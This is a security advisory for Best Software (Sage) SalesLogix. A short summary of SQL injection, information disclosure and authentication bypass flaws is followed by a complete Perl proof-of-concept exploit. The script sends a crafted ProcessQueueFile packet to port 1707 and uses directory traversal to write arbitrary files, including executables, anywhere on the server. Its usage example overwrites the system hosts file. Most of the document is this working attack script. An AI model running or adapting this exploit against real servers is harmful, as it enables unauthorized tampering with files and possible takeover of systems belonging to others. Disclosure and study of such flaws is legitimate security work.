source: http://www.securityfocus.com/bid/11450/info

Best Software SalesLogix is affected by multiple vulnerabilities. These issues are due to design errors that reveal sensitive information, access control validation issues that allow unauthorized access and input validation issues facilitating SQL injection attacks.

An attacker may leverage these issues to manipulate and disclose database contents through SQL injection attacks, steal authentication credentials due to information disclosure vulnerabilities and bypass authentication to gain administrator access to the server.

#!/usr/bin/perl
#
# Proof of concept exploit: Arbitrary file creation for SLX server 6.1
#
# Written by Carl Livitt, Agenda Security Services, June 2004.
#
# This exploit abuses the ProcessQueueFile command on SLX 6.1 (others?)
servers
# to create arbitrary files on the filesystem of the SLX server. By
using
# directory traversal, it is possible to escape from the Queue directory
and
# write anywhere on the SLX server's filesystem.
#

use IO::Socket;

print "slx_uploader - Uploads arbitrary files to Sage SalesLogix
servers.\n";
print "By Carl Livitt @ Agenda Security Services, June 2004\n\n";

if($#ARGV!=2) {
        print "Syntax: $0 host filename_to_create file_to_upload\n\n";
        print "Example:\n";
        print "  $0 10.0.0.100
\\\\winnt\\\\system32\\\\drivers\\\\etc\\\\hosts evil.txt\n\n";
        print "The above example would upload the local file 'evil.txt'
to the SLX\n";
        print "server on 10.0.0.100, overwriting the existing hosts
file.\n";
        print "It is possible to upload binary files, e.g. executables,
with this exploit.\n\n";

        exit(1);
} else {
        $host=$ARGV[0];
        $create_file=$ARGV[1];
        $upload_file=$ARGV[2];
}

if((stat($upload_file))[7] > 4096) {
        print "[*] Error! Files to be uploaded must be less than 4k in
size.\n\n";
        exit(1);
}

print "[+] Building payload\n";
$contentLen=43 + length($create_file);
$exploit="\x00"x10 . chr($contentLen) . "\x00"x3 .
"ProcessQueueFile\x00" . "..\\"x8 . "$create_file" . "\x00"x6;

open(UPLOAD, '<', $upload_file) || die "Could not open local file
$upload_file\n";

while(($line=<UPLOAD>)) {
        $exploit.=$line;
}

close(UPLOAD);

print "[+] Connecting to server $host:1707\n";
$sock=IO::Socket::INET->new("$host:1707") || do {print "[-] Could not
connect to server\n"; exit(1); };

print "[+] Sending exploit payload\n";
send($sock,$exploit,0);

print "[+] Waiting for response\n";
$sock->recv($data,1024,0);

if($data =~ /Received/) {
        print "[+] Exploit successful\n";
} else {
        print "[*] Exploit may not have worked.\n";
}

$sock->shutdown(2);
